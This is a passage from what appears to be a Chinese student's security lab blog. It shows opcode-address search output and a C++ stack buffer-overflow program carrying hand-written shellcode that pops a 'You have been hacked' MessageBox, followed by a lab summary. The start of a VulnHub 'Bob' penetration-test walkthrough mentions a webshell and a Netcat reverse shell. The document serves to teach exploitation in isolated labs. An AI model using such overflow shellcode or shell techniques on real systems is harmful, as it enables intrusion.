0x75941EA7</span><br><span class="line">OPCODE found at 0x75941F1B</span><br><span class="line">OPCODE found at 0x75941F77</span><br><span class="line">OPCODE found at 0x75941FA7</span><br><span class="line">OPCODE found at 0x759420A7</span><br><span class="line">OPCODE found at 0x75942183</span><br><span class="line">OPCODE found at 0x759421A7</span><br><span class="line">OPCODE found at 0x759422A7</span><br><span class="line">OPCODE found at 0x759423A7</span><br><span class="line">OPCODE found at 0x759424A7</span><br><span class="line">OPCODE found at 0x759425A7</span><br><span class="line">OPCODE found at 0x759426A7</span><br><span class="line">OPCODE found at 0x75942783</span><br><span class="line">OPCODE found at 0x759427A7</span><br><span class="line">OPCODE found at 0x759428A7</span><br><span class="line">OPCODE found at 0x759429A7</span><br><span class="line">OPCODE found at 0x75942AA7</span><br><span class="line">OPCODE found at 0x75942BA7</span><br><span class="line">OPCODE found at 0x75942CA7</span><br><span class="line">OPCODE found at 0x75942DA7</span><br><span class="line">OPCODE found at 0x75942EA7</span><br><span class="line">OPCODE found at 0x75942FA7</span><br><span class="line">OPCODE found at 0x759430A7</span><br><span class="line">OPCODE found at 0x759431A7</span><br><span class="line">OPCODE found at 0x759432A7</span><br><span class="line">OPCODE found at 0x759433A7</span><br><span class="line">OPCODE found at 0x759434A7</span><br><span class="line">OPCODE found at 0x759435A7</span><br><span class="line">OPCODE found at 0x759436A7</span><br><span class="line">OPCODE found at 0x759437AB</span><br><span class="line">OPCODE found at 0x7594CBA7</span><br><span class="line">OPCODE found at 0x7594CBCF</span><br><span class="line">OPCODE found at 0x7594D67B</span><br><span class="line">OPCODE found at 0x7594F437</span><br><span class="line">OPCODE found at 0x7594FA27</span><br><span class="line">OPCODE found at 0x75952433</span><br><span class="line">OPCODE found at 0x75958ADB</span><br><span class="line">OPCODE found at 0x759592F7</span><br><span class="line">OPCODE found at 0x75959F07</span><br><span class="line">OPCODE found at 0x7595A10B</span><br><span class="line">OPCODE found at 0x7595A417</span><br><span class="line">OPCODE found at 0x7595ADA7</span><br><span class="line">OPCODE found at 0x7595AEB3</span><br><span class="line">OPCODE found at 0x7595AFB7</span><br><span class="line">OPCODE found at 0x7595B0BF</span><br><span class="line">OPCODE found at 0x7595B1C7</span><br><span class="line">OPCODE found at 0x7595B2CB</span><br><span class="line">OPCODE found at 0x7595B3D3</span><br><span class="line">OPCODE found at 0x7595B6DF</span><br><span class="line">OPCODE found at 0x7595B9F3</span><br><span class="line">OPCODE found at 0x7595BAFF</span><br><span class="line">OPCODE found at 0x7595BC07</span><br><span class="line">OPCODE found at 0x7595BE13</span><br><span class="line">OPCODE found at 0x7595BF1F</span><br><span class="line">OPCODE found at 0x7595CB1F</span><br><span class="line">OPCODE found at 0x7595D70F</span><br><span class="line">OPCODE found at 0x7595D7C7</span><br><span class="line">OPCODE found at 0x7595DDDF</span><br><span class="line">OPCODE found at 0x7595DF0B</span><br><span class="line">OPCODE found at 0x7595DFD3</span><br><span class="line">OPCODE found at 0x7595E09B</span><br><span class="line">OPCODE found at 0x7595E163</span><br><span class="line">OPCODE found at 0x7595E543</span><br><span class="line">OPCODE found at 0x7595E607</span><br><span class="line">OPCODE found at 0x7595E6CF</span><br><span class="line">OPCODE found at 0x7595E797</span><br><span class="line">OPCODE found at 0x7595E857</span><br><span class="line">OPCODE found at 0x7595E913</span><br><span class="line">OPCODE found at 0x7595F097</span><br><span class="line">OPCODE found at 0x7595F0CB</span><br><span class="line">OPCODE found at 0x7595F39F</span><br><span class="line">OPCODE found at 0x7595F6EF</span><br><span class="line">OPCODE found at 0x7595F773</span><br><span class="line">OPCODE found at 0x7595F7FB</span><br><span class="line">OPCODE found at 0x7595FB23</span><br><span class="line">OPCODE found at 0x7595FBA7</span><br><span class="line">OPCODE found at 0x7596008F</span><br><span class="line">OPCODE found at 0x759600D7</span><br><span class="line">OPCODE found at 0x75960163</span><br><span class="line">OPCODE found at 0x75964AE3</span><br><span class="line">OPCODE found at 0x759677BB</span><br><span class="line">OPCODE found at 0x75968B27</span><br><span class="line">OPCODE found at 0x75969827</span><br><span class="line">OPCODE found at 0x759698EB</span><br><span class="line">OPCODE found at 0x75969AC7</span><br><span class="line">OPCODE found at 0x7596B0D3</span><br><span class="line">OPCODE found at 0x7596B7B3</span><br><span class="line">OPCODE found at 0x75970AFB</span><br><span class="line">OPCODE found at 0x759733D3</span><br><span class="line">OPCODE found at 0x759734D3</span><br><span class="line">OPCODE found at 0x759734DB</span><br><span class="line">OPCODE found at 0x759734DF</span><br><span class="line">OPCODE found at 0x759734E3</span><br><span class="line">OPCODE found at 0x759735E7</span><br><span class="line">OPCODE found at 0x759735F7</span><br><span class="line">OPCODE found at 0x759735FB</span><br><span class="line">OPCODE found at 0x75973703</span><br><span class="line">OPCODE found at 0x75973707</span><br><span class="line">OPCODE found at 0x7597370B</span><br><span class="line">OPCODE found at 0x75973917</span><br><span class="line">OPCODE found at 0x75973C27</span><br><span class="line">OPCODE found at 0x75973CEF</span><br><span class="line">OPCODE found at 0x75973D37</span><br><span class="line">OPCODE found at 0x75973E3B</span><br><span class="line">OPCODE found at 0x7597410B</span><br><span class="line">OPCODE found at 0x75974B3F</span><br><span class="line">OPCODE found at 0x759754F7</span><br><span class="line">OPCODE found at 0x75975E77</span><br><span class="line">OPCODE found at 0x75975E7B</span><br><span class="line">OPCODE found at 0x75975E7F</span><br><span class="line">OPCODE found at 0x75975E83</span><br><span class="line">OPCODE found at 0x75975E87</span><br><span class="line">OPCODE found at 0x75975E8B</span><br><span class="line">OPCODE found at 0x75975E8F</span><br><span class="line">OPCODE found at 0x75975E93</span><br><span class="line">OPCODE found at 0x75975F2F</span><br><span class="line">OPCODE found at 0x75975F5F</span><br><span class="line">OPCODE found at 0x75975FEF</span><br><span class="line">OPCODE found at 0x75976283</span><br><span class="line">OPCODE found at 0x75976407</span><br><span class="line">OPCODE found at 0x759764BF</span><br><span class="line">OPCODE found at 0x759764CB</span><br><span class="line">OPCODE found at 0x7597658F</span><br><span class="line">OPCODE found at 0x7597664F</span><br><span class="line">OPCODE found at 0x75976877</span><br><span class="line">OPCODE found at 0x759770EB</span><br><span class="line">OPCODE found at 0x75978073</span><br><span class="line">OPCODE found at 0x75978077</span><br><span class="line">OPCODE found at 0x75978153</span><br><span class="line">OPCODE found at 0x7597CDBF</span><br><span class="line">OPCODE found at 0x7597CDC3</span><br><span class="line">OPCODE found at 0x7597CDC7</span><br><span class="line">OPCODE found at 0x7597CE13</span><br><span class="line">OPCODE found at 0x7597CEEF</span><br><span class="line">OPCODE found at 0x7597CF7B</span><br><span class="line">OPCODE found at 0x7597D07F</span><br><span class="line">OPCODE found at 0x7597D183</span><br><span class="line">OPCODE found at 0x7597DAA7</span><br><span class="line">OPCODE found at 0x7597DBA7</span><br><span class="line">OPCODE found at 0x7597DC1B</span><br><span class="line">OPCODE found at 0x7597DCA7</span><br><span class="line">OPCODE found at 0x7597DD1B</span><br><span class="line">OPCODE found at 0x7597DD77</span><br><span class="line">OPCODE found at 0x7597DDA7</span><br><span class="line">OPCODE found at 0x7597DEA7</span><br><span class="line">OPCODE found at 0x7597DF83</span><br><span class="line">OPCODE found at 0x7597DFA7</span><br><span class="line">OPCODE found at 0x7597E0A7</span><br><span class="line">OPCODE found at 0x7597E1A7</span><br><span class="line">OPCODE found at 0x7597E2A7</span><br><span class="line">OPCODE found at 0x7597E3A7</span><br><span class="line">OPCODE found at 0x7597E4A7</span><br><span class="line">OPCODE found at 0x7597E583</span><br><span class="line">OPCODE found at 0x7597E5A7</span><br><span class="line">OPCODE found at 0x7597E6A7</span><br><span class="line">OPCODE found at 0x7597E7A7</span><br><span class="line">OPCODE found at 0x7597E8A7</span><br><span class="line">OPCODE found at 0x7597E9A7</span><br><span class="line">OPCODE found at 0x7597EAA7</span><br><span class="line">OPCODE found at 0x7597EBA7</span><br><span class="line">OPCODE found at 0x7597ECA7</span><br><span class="line">OPCODE found at 0x7597EDA7</span><br><span class="line">OPCODE found at 0x7597EEA7</span><br><span class="line">OPCODE found at 0x7597EFA7</span><br><span class="line">OPCODE found at 0x7597F0A7</span><br><span class="line">OPCODE found at 0x7597F1A7</span><br><span class="line">OPCODE found at 0x7597F2A7</span><br><span class="line">OPCODE found at 0x7597F3A7</span><br><span class="line">OPCODE found at 0x7597F4A7</span><br><span class="line">OPCODE found at 0x7597F5AB</span><br><span class="line">OPCODE found at 0x7599109B</span><br><span class="line">OPCODE found at 0x7599109F</span><br><span class="line">OPCODE found at 0x759929EB</span><br><span class="line">OPCODE found at 0x75993183</span><br><span class="line">OPCODE found at 0x75993CF7</span><br><span class="line">OPCODE found at 0x75993D0F</span><br><span class="line">OPCODE found at 0x7599481B</span><br><span class="line">OPCODE found at 0x75994BFB</span><br><span class="line">OPCODE found at 0x75994C9F</span><br><span class="line">OPCODE found at 0x7599595B</span><br><span class="line">OPCODE found at 0x7599595F</span><br><span class="line">OPCODE found at 0x75995E8C</span><br><span class="line">OPCODE found at 0x75995E9C</span><br><span class="line">OPCODE found at 0x75995F6C</span><br><span class="line">OPCODE found at 0x7599E18F</span><br><span class="line">OPCODE found at 0x7599FA1B</span><br><span class="line">OPCODE found at 0x759A0FCB</span><br><span class="line">OPCODE found at 0x759A261F</span><br><span class="line">OPCODE found at 0x759A2627</span><br><span class="line">OPCODE found at 0x759A270F</span><br><span class="line">OPCODE found at 0x759A4633</span><br><span class="line">OPCODE found at 0x759A4637</span><br><span class="line">OPCODE found at 0x759B2CF7</span><br><span class="line">OPCODE found at 0x759B38EF</span><br><span class="line">OPCODE found at 0x759B4CE7</span><br><span class="line">OPCODE found at 0x759B512B</span><br><span class="line">OPCODE found at 0x759BF74F</span><br><span class="line">OPCODE found at 0x759C0FDB</span><br><span class="line">OPCODE found at 0x759C258B</span><br><span class="line">OPCODE found at 0x759C3BDF</span><br><span class="line">OPCODE found at 0x759C3BE7</span><br><span class="line">OPCODE found at 0x759C3CCF</span><br><span class="line">OPCODE found at 0x759C5BF3</span><br><span class="line">OPCODE found at 0x759C5BF7</span><br><span class="line">OPCODE found at 0x759C797B</span><br><span class="line">OPCODE found at 0x759C98EB</span><br><span class="line">OPCODE found at 0x759CA1CF</span><br><span class="line">OPCODE found at 0x759E5AA9</span><br><span class="line">OPCODE found at 0x759E66DF</span><br><span class="line">OPCODE found at 0x759E6AE3</span><br><span class="line">OPCODE found at 0x759E6B6F</span><br><span class="line">OPCODE found at 0x759E6B73</span><br><span class="line">OPCODE found at 0x759EEBA3</span><br><span class="line">OPCODE found at 0x759F0D2F</span><br><span class="line">OPCODE found at 0x759F1C91</span><br><span class="line">OPCODE found at 0x759F34B7</span><br><span class="line">OPCODE found at 0x759F457D</span><br><span class="line">OPCODE found at 0x759F8929</span><br><span class="line">OPCODE found at 0x759F9253</span><br><span class="line">OPCODE found at 0x759F955F</span><br><span class="line">OPCODE found at 0x759F9963</span><br><span class="line">OPCODE found at 0x759F99EF</span><br><span class="line">OPCODE found at 0x759F99F3</span><br><span class="line">OPCODE found at 0x75A01A23</span><br><span class="line">OPCODE found at 0x75A03BAF</span><br><span class="line">OPCODE found at 0x75A06337</span><br><span class="line">OPCODE found at 0x75A073FD</span><br><span class="line">OPCODE found at 0x75A0D5BD</span><br><span class="line">OPCODE found at 0x75A105FB</span><br><span class="line">OPCODE found at 0x75A12293</span><br><span class="line">OPCODE found at 0x75A17D19</span><br><span class="line">OPCODE found at 0x75A18A67</span><br><span class="line">OPCODE found at 0x75A1AEEB</span><br><span class="line">OPCODE found at 0x75A1BF31</span><br><span class="line">OPCODE found at 0x75A1DBA1</span><br></pre></td></tr></table></figure>
<p><code>strcy.cpp</code>程序实现</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意代码的shellcode，使用十六进制表示</span></span><br><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x0F\x94\x75&quot;</span><span class="comment">//这里调用</span></span><br><span class="line"><span class="string">&quot;\x83\xEC\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x69\x6E\x67\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x57\x61\x72\x6E&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x21\x20\x20\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x6B\x65\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x6E\x20\x68\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x62\x65\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\x61\x76\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x59\x6F\x75\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xCC&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\x10\xa1\x8f\x75&quot;</span><span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\xd0\x74\x41\x76&quot;</span> <span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> st[<span class="number">11</span>];</span><br><span class="line">		<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="comment">// 将shellcode复制到更小的缓冲区，这可能导致缓冲区溢出</span></span><br><span class="line">	<span class="built_in">strcpy</span>(st, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,st);</span><br><span class="line">	<span class="comment">// 打印复制到缓冲区的内容</span></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  以下是注释掉的代码，看起来像是用于动态加载库的代码片段，可能用于进一步的溢出利用</span></span><br><span class="line"><span class="comment">  &quot;\x8D\x4C\x24\x04&quot;</span></span><br><span class="line"><span class="comment">  &quot;\x83\xE4\xF0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\x71\xFC&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x55&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x89\xE5&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x51&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x14&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xE8\x8A\x09\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x0C\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x08\x00\x40\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x04\x08\x40\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\xE0\x61\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x10&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\x24\x61\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141932525.png" class="" title="image-20240131141932525">
<h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><h4 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h4><ul>
<li><strong>理论与实践结合</strong>：通过实验操作，加深了对缓冲区溢出攻击原理的理解。</li>
<li><strong>问题解决能力</strong>：在实验过程中遇到问题，如编译模式对栈空间的影响，学会了如何查找和解决问题。</li>
<li><strong>安全意识提升</strong>：认识到了安全编程的重要性，以及在软件开发中预防缓冲区溢出的必要性。</li>
</ul>
<h4 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a>实验方法</h4><ol>
<li>精确定位返回地址的位置：通过调试工具（如OllyDbg）观察程序执行过程中堆栈的变化，找到返回地址。</li>
<li>寻找一个合适的地址用于覆盖原始地址：使用jmp esp或call esp等指令，跳转到shellcode执行。</li>
<li>编写shellcode到相应的缓冲区中：编写能够执行特定功能的shellcode，并将其放入程序的缓冲区。</li>
</ol>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ul>
<li>成功实现了缓冲区溢出，程序执行了预期的MessageBox弹窗警告。</li>
<li>通过IDA Pro分析，确认了shellcode执行后程序的控制流程。</li>
</ul>
<h4 id="分析与讨论"><a href="#分析与讨论" class="headerlink" title="分析与讨论"></a>分析与讨论</h4><ul>
<li>实验结果符合预期，验证了缓冲区溢出攻击的可行性。</li>
<li>实验中遇到的问题，如编译模式对栈空间的影响，以及动态链接库的加载，都对攻击成功与否有重要影响。</li>
</ul>
<h4 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h4><ul>
<li>缓冲区溢出攻击是一种有效的软件漏洞利用技术，需要开发者在编写程序时注意边界检查和内存管理。</li>
<li>实验加深了对缓冲区溢出攻击原理的理解，提高了安全编程意识。</li>
</ul>
<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ul>
<li><strong>实验目的达成</strong>：成功完成了缓冲区溢出攻击的模拟，实现了预期的功能。</li>
<li><strong>实验过程记录</strong>：详细记录了实验步骤和遇到的问题，为后续分析提供了依据。</li>
<li><strong>实验结果分析</strong>：对实验结果进行了分析，与理论预期进行了比较，得出了有意义的结论。</li>
<li><strong>实验意义</strong>：实验不仅提升了技术能力，更重要的是提高了安全意识，对于未来的软件开发和安全防护工作具有重要意义。</li>
</ul>
<h2 id="实训2-项目名称：-Bob渗透测试"><a href="#实训2-项目名称：-Bob渗透测试" class="headerlink" title="实训2 项目名称：   Bob渗透测试"></a>实训2 项目名称：   Bob渗透测试</h2><h4 id="一、环境及工具-1"><a href="#一、环境及工具-1" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><ul>
<li><strong>操作系统</strong>：Kali Linux</li>
<li><strong>测试网络</strong>：安全隔离的内部网络，确保实验不影响外部网络</li>
<li><p><strong>目标主机</strong>：模拟的受害者计算机（称为Bob）</p>
<ul>
<li>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a><br>靶机名称：bob-101，下载ova格式文件，直接在虚拟机打开，网络适配器中设置为NAT模式网卡即可。</li>
</ul>
</li>
<li><p><strong>前置知识</strong>：网络安全基础，Linux操作系统，渗透测试方法</p>
</li>
<li><strong>必要的课程/说明</strong>：网络安全概念，渗透测试原理</li>
<li><strong>推荐文章链接</strong>：<ol>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">Nmap使用详解</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/124246499">Nikto工具使用教程</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">Dirb使用教程</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html">NC工具使用方法</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">https://zhuanlan.zhihu.com/p/220143826</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/z2560088/article/details/120397193">https://blog.csdn.net/z2560088/article/details/120397193</a></li>
</ol>
</li>
</ul>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ol>
<li><strong>Nmap</strong>：用于主机发现和端口扫描</li>
<li><strong>Nikto</strong>：用于网站漏洞扫描</li>
<li><strong>Dirb</strong>：用于敏感文件和目录的探索</li>
<li><strong>Burp Suite</strong>：用于Web应用的安全测试</li>
<li><strong>Netcat（NC）</strong>：用于网络操作，如端口监听和Shell连接</li>
</ol>
<h5 id="实验概述-1"><a href="#实验概述-1" class="headerlink" title="实验概述"></a>实验概述</h5><p><strong>目的</strong>：通过对目标主机Bob的渗透测试，理解和掌握基本的网络安全渗透方法。</p>
<p><strong>要求</strong>：</p>
<ul>
<li>完成对目标主机的信息收集</li>
<li>执行渗透测试</li>
<li>获取目标主机控制权</li>
<li>进行后续的深度渗透和数据分析</li>
</ul>
<p><strong>原理</strong>：使用渗透测试工具进行目标主机的漏洞扫描、利用发现的漏洞获取目标主机的控制权，从而理解攻击者可能利用的方法和手段。</p>
<h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><p>靶场</p>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bob-101,226/">Bob: 1.0.1 ~ VulnHub</a> </p>
<p>攻击工具<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&amp;spm=1001.2101.3001.7020">kali</a>虚拟机</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871442433-3.png" class="" title="img">
 <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
<p> 直接双击打开即可添加到虚拟机。打开后网卡使用NAT模式。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871446757-6.png" class="" title="img">
<p>没有给用户名和密码。（给了就没有攻击的必要了 hhh）</p>
<h4 id="二、实训流程及分析-1"><a href="#二、实训流程及分析-1" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h4><h5 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h5><ul>
<li><strong>操作</strong>：使用Nmap进行目标主机发现和端口扫描。</li>
<li><strong>目的</strong>：确定目标主机在网络上的存在，并识别开放的端口和服务。</li>
<li><strong>分析</strong>：通过扫描结果，获取目标主机的网络结构和潜在漏洞点。</li>
</ul>
<h5 id="2-网站信息收集"><a href="#2-网站信息收集" class="headerlink" title="2. 网站信息收集"></a>2. 网站信息收集</h5><ul>
<li><strong>操作</strong>：使用Nikto扫描目标网站。</li>
<li><strong>目的</strong>：寻找网站潜在的安全漏洞和敏感信息。</li>
<li><strong>分析</strong>：识别出的漏洞为后续的渗透提供了切入点。</li>
</ul>
<h5 id="3-敏感文件扫描"><a href="#3-敏感文件扫描" class="headerlink" title="3. 敏感文件扫描"></a>3. 敏感文件扫描</h5><ul>
<li><strong>操作</strong>：用Dirb工具进行网页敏感文件扫描。</li>
<li><strong>目的</strong>：探索和识别隐藏的、未经授权的文件和目录。</li>
<li><strong>分析</strong>：发现的敏感文件可能包含有用的信息，为进一步的渗透提供帮助。</li>
</ul>
<h5 id="4-渗透测试"><a href="#4-渗透测试" class="headerlink" title="4. 渗透测试"></a>4. 渗透测试</h5><ul>
<li><strong>操作</strong>：通过Webshell在浏览器中执行命令。</li>
<li><strong>目的</strong>：验证网站的安全性和执行服务器命令的能力。</li>
<li><strong>分析</strong>：执行的命令和反馈结果帮助了解目标系统的内部结构。</li>
</ul>
<h5 id="5-抓包分析"><a href="#5-抓包分析" class="headerlink" title="5. 抓包分析"></a>5. 抓包分析</h5><ul>
<li><strong>操作</strong>：使用Burp Suite捕捉和分析网络流量。</li>
<li><strong>目的</strong>：观察数据传输过程，寻找可能的安全漏洞。</li>
<li><strong>分析</strong>：捕获的数据包揭示了Web应用的通信细节和潜在的安全问题。</li>
</ul>
<h5 id="6-获取Shell控制权"><a href="#6-获取Shell控制权" class="headerlink" title="6. 获取Shell控制权"></a>6. 获取Shell控制权</h5><ul>
<li><strong>操作</strong>：通过Netcat在Kali上监听端口，然后通过Burp Suite发起Shell链接。</li>
<li><strong>目的</strong>：获得目标主机的控制权。</li>
<li><strong>分析</strong>：成功连接到Shell意味着可以远程控制目标主机。</li>
</ul>
<h5 id="7-具体细节"><a href="#7-具体细节" class="headerlink" title="7. 具体细节"></a>7. 具体细节</h5><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104101540865.png" class="" title="image-20240104101540865">
<p><strong>本地信息收集</strong><br>打开kali（集成了大量渗透工具）。<br>使用nmap扫描神器探测本网段存活主机IP，从而确定靶机IP地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.233.135  netmask 255.255.255.0  broadcast 192.168.233.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe98:3ed0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:98:3e:d0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 3959  bytes 3668336 (3.4 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2113  bytes 305050 (297.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 448  bytes 